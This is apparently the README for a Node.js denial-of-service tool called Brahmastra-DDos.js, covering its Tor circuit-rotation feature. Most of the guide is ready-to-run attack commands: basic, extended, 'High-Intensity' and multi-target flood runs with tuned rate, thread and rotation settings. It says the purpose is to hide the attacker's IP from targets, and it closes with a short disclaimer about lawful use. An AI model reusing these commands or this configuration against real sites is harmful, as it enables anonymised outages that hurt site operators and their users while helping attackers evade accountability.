# Tor Circuit Support Guide

## 🌐 What is Tor Circuit Support?

Tor Circuit Support is a powerful feature that enables **anonymous routing** through the Tor network with automatic **circuit rotation**. This provides enhanced privacy and security by:

- **Hiding your real IP address** from targets and observers
- **Routing traffic through multiple Tor nodes** for anonymity
- **Automatically rotating circuits** to prevent correlation attacks
- **Integrating seamlessly** with the existing proxy system

## 🔧 How Tor Circuits Work

### Circuit Structure
```
Your Computer → Entry Node → Middle Node → Exit Node → Target
     ↓              ↓           ↓          ↓
   Hidden        Hidden     Hidden     Hidden
   (You)       (Entry)    (Middle)   (Exit)
```

### Circuit Rotation
- **Default rotation**: Every 30 seconds
- **Configurable intervals**: Customize with `--tor-rotate=N`
- **Automatic management**: No manual intervention required
- **Connection pooling**: Efficient reuse of established circuits

## 🚀 Getting Started with Tor Circuits

### Prerequisites

#### 1. Install Tor Service
You need either **Tor Browser** or a **Tor service** running locally:

**Option A: Tor Browser (Recommended for beginners)**
- Download from [torproject.org](https://www.torproject.org/)
- Install and run Tor Browser
- Ensure SOCKS proxy is enabled on port 9050

**Option B: Tor Service (Advanced users)**
```bash
# Ubuntu/Debian
sudo apt-get install tor

# macOS
brew install tor

# Windows
# Download and install from torproject.org
```

#### 2. Verify SOCKS Proxy
Ensure Tor is running and accessible:
```bash
# Check if port 9050 is listening
netstat -an | grep 9050

# Test SOCKS connection
curl --socks5 127.0.0.1:9050 https://check.torproject.org/
```

#### 3. Install Dependencies
```bash
npm install
```

### Basic Usage

#### Enable Tor Circuit Support
```bash
# Basic Tor support
node Brahmastra-DDos.js https://example.com 60 32 4 proxy.txt --tor

# Custom rotation interval (every 2 minutes)
node Brahmastra-DDos.js https://example.com 300 64 8 proxy.txt --tor --tor-rotate=120

# Combine with demo mode
node Brahmastra-DDos.js https://example.com 30 16 2 proxy.txt demo --tor
```

## ⚙️ Configuration Options

### Tor Circuit Parameters

| Parameter | Default | Description |
|-----------|---------|-------------|
| `--tor` | Disabled | Enable Tor circuit support |
| `--tor-rotate=N` | 30 | Circuit rotation interval in seconds |

### Advanced Configuration
```javascript
// In Brahmastra-DDos.js
const TOR_CONFIG = {
    defaultProxy: 'socks5://127.0.0.1:9050',    // Tor SOCKS proxy
    circuitRotationInterval: 30,                 // Rotation interval
    maxCircuits: 10,                            // Maximum circuits
    controlPort: 9051,                          // Tor control port
    enabled: false                              // Default state
};
```

## 📊 Understanding Output

### Tor Circuit Status Messages
```
[TOR CIRCUIT] (14:30:15) Tor Circuit Rotation Enabled
[TOR CIRCUIT] (14:30:15) Proxy: socks5://127.0.0.1:9050
[TOR CIRCUIT] (14:30:15) Rotation Interval: 30s
[TOR CIRCUIT] (14:30:15) Circuit Rotation Interval: 30s
```

### Circuit Rotation Messages
```
[TOR CIRCUIT] (14:30:45) Rotated to Circuit 2
[TOR CIRCUIT] (14:31:15) Rotated to Circuit 3
[TOR CIRCUIT] (14:31:45) Rotated to Circuit 4
```

### Demo Mode with Tor
```
[DEMO MODE] (14:30:15) Tor Circuit Mode: ENABLED
[DEMO MODE] (14:30:15) Circuit Rotation: 30s
[DEMO MODE] (14:30:16) Simulated 8 requests | Time remaining: 4s | Fake IP: 192.168.1.1 | Circuit: 1
[DEMO MODE] (14:30:45) Simulated Tor Circuit Rotation #1
```

## 🔍 Troubleshooting

### Common Issues

#### 1. "Tor not working" or "Connection refused"
**Symptoms:**
- Tool runs but shows no Tor circuit messages
- Connection errors in logs

**Solutions:**
```bash
# Check if Tor is running
ps aux | grep tor

# Verify SOCKS proxy is accessible
curl --socks5 127.0.0.1:9050 https://httpbin.org/ip

# Check firewall settings
sudo ufw status
```

#### 2. "Circuit rotation not working"
**Symptoms:**
- No rotation messages
- Stuck on same circuit

**Solutions:**
```bash
# Verify rotation interval
node Brahmastra-DDos.js https://example.com 60 32 4 proxy.txt --tor --tor-rotate=60

# Check Tor service logs
tail -f /var/log/tor/log

# Restart Tor service
sudo systemctl restart tor
```

#### 3. "Slow performance with Tor"
**Symptoms:**
- Significantly slower than direct connection
- Timeout errors

**Solutions:**
- **Increase rotation interval**: Use `--tor-rotate=120` for less frequent changes
- **Reduce request rate**: Lower the rate parameter
- **Use fewer threads**: Reduce thread count for better stability
- **Check Tor network**: Tor may be experiencing high load

### Performance Optimization

#### Circuit Rotation Timing
```bash
# For high-speed attacks (less privacy, more speed)
node Brahmastra-DDos.js https://example.com 60 128 16 proxy.txt --tor --tor-rotate=60

# For maximum privacy (more privacy, less speed)
node Brahmastra-DDos.js https://example.com 60 32 8 proxy.txt --tor --tor-rotate=30

# For balanced approach
node Brahmastra-DDos.js https://example.com 60 64 12 proxy.txt --tor --tor-rotate=45
```

#### Thread and Rate Optimization
```bash
# Conservative settings for stability
node Brahmastra-DDos.js https://example.com 300 16 4 proxy.txt --tor

# Moderate settings for balance
node Brahmastra-DDos.js https://example.com 300 32 8 proxy.txt --tor

# Aggressive settings (may be unstable)
node Brahmastra-DDos.js https://example.com 300 64 16 proxy.txt --tor
```

## 🛡️ Security Considerations

### Privacy Benefits
- **IP Address Hiding**: Your real IP is never visible to targets
- **Traffic Obfuscation**: All traffic appears to come from Tor exit nodes
- **Circuit Isolation**: Each circuit uses different paths through the network
- **Automatic Rotation**: Prevents correlation of multiple requests

### Limitations
- **Speed Impact**: Tor routing adds latency
- **Exit Node Risk**: Exit nodes can see unencrypted traffic
- **Circuit Correlation**: Rapid rotation may not provide full anonymity
- **Service Detection**: Some services block Tor exit nodes

### Best Practices
1. **Use HTTPS targets** to encrypt traffic to exit nodes
2. **Avoid rapid rotation** for maximum anonymity
3. **Monitor circuit quality** and adjust timing accordingly
4. **Combine with other privacy measures** for enhanced security

## 🔧 Advanced Usage

### Custom Tor Configuration
```bash
# Use custom Tor proxy
export TOR_PROXY="socks5://192.168.1.100:9050"

# Use Tor with authentication
export TOR_PROXY="socks5://user:pass@127.0.0.1:9050"

# Use Tor over SSH tunnel
ssh -D 9050 user@remote-server
```

### Multi-Circuit Attacks
```bash
# Run multiple instances with different circuits
# Terminal 1
node Brahmastra-DDos.js https://target1.com 300 32 4 proxy.txt --tor --tor-rotate=45

# Terminal 2
node Brahmastra-DDos.js https://target2.com 300 32 4 proxy.txt --tor --tor-rotate=60

# Terminal 3
node Brahmastra-DDos.js https://target3.com 300 32 4 proxy.txt --tor --tor-rotate=90
```

### Circuit Quality Monitoring
```bash
# Monitor circuit performance
watch -n 5 "netstat -an | grep 9050"

# Check Tor service status
sudo systemctl status tor

# View Tor logs
tail -f /var/log/tor/log
```

## 📚 Examples

### Basic Tor Attack
```bash
# 1-minute attack with Tor circuits
node Brahmastra-DDos.js https://example.com 60 32 4 proxy.txt --tor
```

### Extended Tor Attack
```bash
# 10-minute attack with 2-minute circuit rotation
node Brahmastra-DDos.js https://example.com 600 64 8 proxy.txt --tor --tor-rotate=120
```

### Demo Mode with Tor
```bash
# Safe simulation with Tor circuit rotation
node Brahmastra-DDos.js https://example.com 30 16 2 proxy.txt demo --tor
```

### High-Intensity Tor Attack
```bash
# High-rate attack with frequent circuit rotation
node Brahmastra-DDos.js https://example.com 120 128 16 proxy.txt --tor --tor-rotate=30
```

## 🚨 Important Notes

### Legal and Ethical Use
- **Only test systems you own** or have explicit permission to test
- **Comply with local laws** regarding network testing
- **Use responsibly** for educational and research purposes
- **Respect rate limits** and avoid overwhelming legitimate services

### Technical Limitations
- **Tor network dependency** - Requires functioning Tor service
- **Performance impact** - Slower than direct connections
- **Circuit availability** - Depends on Tor network health
- **Exit node restrictions** - Some services block Tor traffic

### Maintenance
- **Keep Tor updated** for security and performance
- **Monitor circuit quality** and adjust parameters
- **Check for updates** to the tool and dependencies
- **Backup configurations** before making changes

## 🔗 Additional Resources

### Tor Documentation
- [Tor Project](https://www.torproject.org/)
- [Tor Browser Manual](https://tb-manual.torproject.org/)
- [Tor Network Status](https://torstatus.blutmagie.de/)

### Security Resources
- [Tor Security Advisories](https://blog.torproject.org/category/tor-security-advisories)
- [Circuit Isolation](https://2019.www.torproject.org/docs/tor-manual.html.en#CircuitIsolation)
- [Exit Node Guidelines](https://trac.torproject.org/projects/tor/wiki/doc/TorExitGuidelines)

### Community Support
- [Tor Project Forums](https://forum.torproject.net/)
- [Stack Overflow](https://stackoverflow.com/questions/tagged/tor)
- [Reddit r/TOR](https://www.reddit.com/r/TOR/)

---

**Remember**: Tor Circuit Support provides enhanced privacy and anonymity, but it's not a guarantee of complete security. Always use this tool responsibly and in compliance with applicable laws and regulations.
